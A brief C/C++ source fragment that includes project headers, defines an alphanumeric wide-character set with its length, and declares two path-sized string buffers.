#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

const WCHAR szCharSet[] = {
	L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	L"abcdefghijklmnopqrstuvwxyz"
	L"1234567890"
};
const size_t cnCharSet = (sizeof(szCharSet) - 2) / 2;

WCHAR szCd[MAX_PATH];
WCHAR szMfn[MAX_PATH];